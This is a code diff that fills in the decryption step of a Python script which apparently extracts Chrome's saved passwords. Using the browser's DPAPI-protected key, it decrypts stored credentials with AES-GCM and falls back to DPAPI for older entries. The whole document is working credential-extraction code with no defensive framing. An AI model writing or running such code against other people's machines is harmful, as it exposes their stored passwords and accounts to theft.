@@ -43,12 +43,25 @@ def fetching_encryption_key():
     # return decrypted key
     return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]
 
-def password_decryption(passord, encryption_key):
+def password_decryption(password, encryption_key):
     """
     Decrypts a password using the chrome decryption key.
     """
 
-    pass
+    try:
+        iv = password[3:15]
+        password = password[15:]
+
+        # generate cipher
+        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
+
+        # decrypt password
+        return cipher.decrypt(password)[:-16].decode()
+    except:
+        try:
+            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[0])
+        except:
+            return "No Passwords"
 
 def fetch_passwords():
     """
